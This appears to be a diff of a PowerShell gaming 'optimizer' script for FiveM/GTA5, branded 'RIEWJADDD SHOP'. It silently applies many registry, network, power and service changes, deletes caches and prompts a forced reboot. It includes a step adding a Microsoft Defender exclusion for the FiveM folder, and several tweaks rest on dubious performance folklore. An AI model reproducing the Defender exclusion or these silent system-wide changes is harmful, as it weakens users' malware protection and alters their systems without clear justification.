+$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+if ($ram -lt 16) { Stop-Service SysMain -Force -ErrorAction SilentlyContinue; Set-Service SysMain -StartupType Disabled -ErrorAction SilentlyContinue }
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v IoPageLockLimit  /t REG_DWORD /d 0 /f 2>$null | Out-Null
+
+Spin "Nuking junk files" 500
+Remove-Item "$env:Temp\*"       -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+Spin "Stripping Windows animations" 400
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f 2>$null | Out-Null
+reg add "HKCU\Control Panel\Desktop"               /v DragFullWindows   /t REG_SZ    /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Control Panel\Desktop"               /v MenuShowDelay     /t REG_SZ    /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v MinAnimate        /t REG_SZ    /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ListviewAlphaSelect /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ListviewShadow      /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarAnimations   /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\DWM"      /v EnableAeroPeek            /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\DWM"      /v AlwaysHibernateThumbnails /t REG_DWORD /d 0 /f 2>$null | Out-Null
+
+Spin "Injecting low-ping network stack" 900
+netsh int tcp set global autotuninglevel=normal  2>$null | Out-Null
+netsh int tcp set global chimney=disabled        2>$null | Out-Null
+netsh int tcp set global ecncapability=disabled  2>$null | Out-Null
+netsh int tcp set global timestamps=disabled     2>$null | Out-Null
+netsh int tcp set global rss=enabled             2>$null | Out-Null
+netsh int tcp set global rsc=disabled            2>$null | Out-Null
+if ($WinBuild -lt 22000) {
+    netsh int tcp set global fastopen=enabled 2>$null | Out-Null
+    netsh int tcp set global dca=enabled      2>$null | Out-Null
+    netsh int tcp set global netdma=enabled   2>$null | Out-Null
+}
+$adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
+foreach ($a in $adapters) {
+    $name = $a.Name
+    netsh interface ipv4 set subinterface "$name" mtu=1500 store=persistent 2>$null | Out-Null
+    try {
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Energy Efficient Ethernet" -DisplayValue "Disabled" -ErrorAction SilentlyContinue
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Green Ethernet"            -DisplayValue "Disabled" -ErrorAction SilentlyContinue
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Power Saving Mode"         -DisplayValue "Disabled" -ErrorAction SilentlyContinue
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Receive Buffers"           -DisplayValue "2048"     -ErrorAction SilentlyContinue
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Transmit Buffers"          -DisplayValue "2048"     -ErrorAction SilentlyContinue
+        Set-NetAdapterAdvancedProperty -Name $name -DisplayName "Interrupt Moderation"      -DisplayValue "Disabled" -ErrorAction SilentlyContinue
+    } catch {}
+}
+$ifaces = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" -ErrorAction SilentlyContinue
+foreach ($iface in $ifaces) {
+    $rp = "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$($iface.PSChildName)"
+    reg add "$rp" /v TcpNoDelay      /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "$rp" /v TcpDelAckTicks  /t REG_DWORD /d 0 /f 2>$null | Out-Null
+    reg add "$rp" /v TcpAckFrequency /t REG_DWORD /d 1 /f 2>$null | Out-Null
+}
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v MaxCacheTtl         /t REG_DWORD /d 3600 /f 2>$null | Out-Null
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v MaxNegativeCacheTtl /t REG_DWORD /d 0    /f 2>$null | Out-Null
+ipconfig /flushdns 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v NetworkThrottlingIndex /t REG_DWORD /d 4294967295 /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v NonBestEffortLimit /t REG_DWORD /d 0 /f 2>$null | Out-Null
+
+Spin "Boosting IRQ priority" 500
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v IRQ8Priority /t REG_DWORD /d 1 /f 2>$null | Out-Null
+$netAdapters = Get-WmiObject Win32_PnPEntity | Where-Object { $_.Name -match "Ethernet|Wi-Fi|Wireless|Network" -and $_.DeviceID -match "PCI" } | Select-Object -First 3
+foreach ($dev in $netAdapters) {
+    try {
+        $devPath      = "HKLM\SYSTEM\CurrentControlSet\Enum\$($dev.DeviceID)\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties"
+        $affinityPath = "HKLM\SYSTEM\CurrentControlSet\Enum\$($dev.DeviceID)\Device Parameters\Interrupt Management\Affinity Policy"
+        reg add "$devPath"      /v MSISupported   /t REG_DWORD /d 1 /f 2>$null | Out-Null
+        reg add "$affinityPath" /v DevicePolicy   /t REG_DWORD /d 4 /f 2>$null | Out-Null
+        reg add "$affinityPath" /v DevicePriority /t REG_DWORD /d 3 /f 2>$null | Out-Null
+    } catch {}
+}
+
+Spin "Injecting game process profile" 500
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v SystemResponsiveness /t REG_DWORD /d 0   /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority"        /t REG_DWORD /d 8    /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v Priority              /t REG_DWORD /d 6    /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ    /d High /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority"       /t REG_SZ    /d High /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only"     /t REG_SZ    /d False /f 2>$null | Out-Null
+
+Spin "Enabling raw mouse input" 350
+reg add "HKCU\Control Panel\Mouse" /v MouseSpeed      /t REG_SZ /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Control Panel\Mouse" /v MouseThreshold1 /t REG_SZ /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Control Panel\Mouse" /v MouseThreshold2 /t REG_SZ /d 0 /f 2>$null | Out-Null
+
+Spin "GPU stability tuning" 400
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v TdrDelay    /t REG_DWORD /d 10 /f 2>$null | Out-Null
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v TdrDdiDelay /t REG_DWORD /d 20 /f 2>$null | Out-Null
+
+Spin "Applying $GPUType driver tweaks" 600
+if ($GPUType -eq "NVIDIA") {
+    $nvPath = "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak"
+    reg add "$nvPath" /v PowerMizerEnable  /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "$nvPath" /v PowerMizerLevel   /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "$nvPath" /v PowerMizerLevelAC /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\PowerProfiles\PowerProfile_0" /v PowerProfile /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\NVTweak" /v ShaderCacheSize /t REG_DWORD /d 4294967295 /f 2>$null | Out-Null
+} elseif ($GPUType -eq "AMD") {
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v KMD_EnableComputePreemption /t REG_DWORD /d 0 /f 2>$null | Out-Null
+}
+
+Spin "Setting FiveM process priority HIGH" 400
+$ifeoBase = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+foreach ($exe in @("FiveM.exe","GTA5.exe")) {
+    reg add "$ifeoBase\$exe\PerfOptions" /v CpuPriorityClass /t REG_DWORD /d 3 /f 2>$null | Out-Null
+    reg add "$ifeoBase\$exe\PerfOptions" /v IoPriority       /t REG_DWORD /d 3 /f 2>$null | Out-Null
+}
+foreach ($name in @("FiveM","FiveM_b2060","GTA5","GTAVLauncher","fivem_web_b2060")) {
+    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
+    if ($proc) { try { $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High } catch {} }
+}
+
+Spin "Optimizing pagefile + timer resolution" 500
+$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+if ($ram -lt 16) {
+    try {
+        $initMB = [int]($ram * 1024 * 1.5); $maxMB = [int]($ram * 1024 * 3)
+        $cs = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($cs) { $cs.AutomaticManagedPagefile = $false; $cs.Put() | Out-Null }
+        $pf = Get-WmiObject -Class Win32_PageFileSetting -ErrorAction SilentlyContinue
+        if ($pf) { $pf.InitialSize = $initMB; $pf.MaximumSize = $maxMB; $pf.Put() | Out-Null }
+    } catch {}
+}
+try {
+    $src = @"
+using System; using System.Runtime.InteropServices;
+public class TimerRes { [DllImport("winmm.dll")] public static extern uint timeBeginPeriod(uint uPeriod); }
+"@
+    Add-Type -TypeDefinition $src -Language CSharp -ErrorAction SilentlyContinue
+    [TimerRes]::timeBeginPeriod(1) | Out-Null
+} catch {}
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v GlobalTimerResolutionRequests /t REG_DWORD /d 1 /f 2>$null | Out-Null
+
+Spin "Disabling core parking + HPET" 600
+$schemes = powercfg -list 2>$null | Select-String "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" | ForEach-Object { $_.Matches[0].Value }
+foreach ($scheme in $schemes) {
+    powercfg -setacvalueindex $scheme SUB_PROCESSOR CPMINCORES 100 2>$null | Out-Null
+    powercfg -setacvalueindex $scheme SUB_PROCESSOR CPMAXCORES 100 2>$null | Out-Null
+}
+$ppPath = "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583"
+reg add "$ppPath" /v ValueMin /t REG_DWORD /d 100 /f 2>$null | Out-Null
+reg add "$ppPath" /v ValueMax /t REG_DWORD /d 100 /f 2>$null | Out-Null
+bcdedit /deletevalue useplatformclock 2>$null | Out-Null
+$hpetKey = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Enum\ACPI\PNP0103" -ErrorAction SilentlyContinue | Select-Object -First 1
+if ($hpetKey) {
+    $hpetReg = ($hpetKey.Name -replace "HKEY_LOCAL_MACHINE","HKLM") + "\Device Parameters"
+    reg add "$hpetReg" /v DisableHPET /t REG_DWORD /d 1 /f 2>$null | Out-Null
+}
+
+Spin "Tuning prefetch + NVIDIA Reflex" 500
+$pfPath = "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+reg add "$pfPath" /v EnablePrefetcher /t REG_DWORD /d 2 /f 2>$null | Out-Null
+reg add "$pfPath" /v EnableSuperfetch /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "$pfPath" /v EnableBootTrace  /t REG_DWORD /d 0 /f 2>$null | Out-Null
+if ($GPUType -eq "NVIDIA") {
+    $nvUll = "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak"
+    reg add "$nvUll" /v UllModeEnabled /t REG_DWORD /d 1 /f 2>$null | Out-Null
+    reg add "$nvUll" /v UllModeLevel   /t REG_DWORD /d 2 /f 2>$null | Out-Null
+    reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\NVTweak" /v MaxFramesAllowed /t REG_DWORD /d 1 /f 2>$null | Out-Null
+}
+
+Spin "Killing Windows bandwidth theft" 400
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v DODownloadMode /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v DownloadMode         /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v DownloadModeProvider /t REG_DWORD /d 0 /f 2>$null | Out-Null
+Stop-Service "DoSvc" -Force -ErrorAction SilentlyContinue
+Set-Service  "DoSvc" -StartupType Disabled -ErrorAction SilentlyContinue
+
+Spin "Adding FiveM to Defender exclusions" 400
+try {
+    $defSvc = Get-Service "WinDefend" -ErrorAction SilentlyContinue
+    if ($defSvc -and $defSvc.Status -eq "Running") {
+        if (Test-Path "$env:LOCALAPPDATA\FiveM") { Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\FiveM" -ErrorAction SilentlyContinue }
+    }
+} catch {}
+
+Spin "Wiping FiveM stream cache" 500
+if ($global:FiveMFound) {
+    foreach ($cp in @("$env:LOCALAPPDATA\FiveM\FiveM.app\data\cache","$env:LOCALAPPDATA\FiveM\FiveM.app\logs")) {
+        if (Test-Path $cp) { Get-ChildItem -Path $cp -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+}
+
+Spin "Rebuilding $GPUType shader cache" 500
+if ($GPUType -eq "NVIDIA") {
+    foreach ($p in @("$env:LOCALAPPDATA\NVIDIA\DXCache","$env:LOCALAPPDATA\NVIDIA\GLCache")) {
+        if (Test-Path $p) { Get-ChildItem -Path $p -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+} elseif ($GPUType -eq "AMD") {
+    foreach ($p in @("$env:LOCALAPPDATA\AMD\DXCache","$env:LOCALAPPDATA\AMD\GLCache","$env:LOCALAPPDATA\AMD\VkCache")) {
+        if (Test-Path $p) { Get-ChildItem -Path $p -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+}
+
+# ========================================================
+# OUTRO
+# ========================================================
+Write-Host ""
+PulseBar "Finalizing RIEWJADDD SHOP" 32
+Write-Host ""
+
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+Flicker "  RIEWJADDD SHOP OPTIMIZATION COMPLETE" 5
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+Write-Host ""
+
+$items = @(
+    "CPU scheduling + core parking OFF"
+    "HPET disabled"
+    "Keyboard response optimized"
+    "FPS-killing overlays removed"
+    "Fullscreen optimizations disabled"
+    "Hibernation disabled"
+    "RAM reserved for FiveM"
+    "Windows animations stripped"
+    "Low-ping TCP stack injected"
+    "IRQ priority maximized"
+    "Nagle OFF - packets fly to server"
+    "FiveM at HIGH CPU priority"
+    "$GPUType driver tweaks applied"
+    "Raw mouse - zero acceleration"
+    "Prefetch tuned for FiveM"
+    "P2P bandwidth theft stopped"
+    "Defender exclusion added"
+    "Pagefile fixed + Timer 1ms"
+    "Stream + shader cache rebuilt"
+)
+
+foreach ($item in $items) { DONE_LINE $item; Start-Sleep -Milliseconds 35 }
+
+Write-Host ""
+$Host.UI.RawUI.ForegroundColor = "Red"
+Write-Host "  REBOOT RECOMMENDED - then drop into FiveM."
+Write-Host ""
+
+# -- Reboot prompt ----------------------------------------
+$reboot = [System.Windows.Forms.MessageBox]::Show(
+    "RIEWJADDD SHOP v$GHOST_VERSION Complete!`n`nReboot now for full effect?",
+    "RIEWJADDD SHOP",
+    [System.Windows.Forms.MessageBoxButtons]::YesNo,
+    [System.Windows.Forms.MessageBoxIcon]::Information
+)
+Write-Host "  Log saved to: $LogPath" -ForegroundColor DarkGray
+try { Stop-Transcript | Out-Null } catch {}
+
+if ($reboot -eq [System.Windows.Forms.DialogResult]::Yes) {
+    Restart-Computer -Force
+}
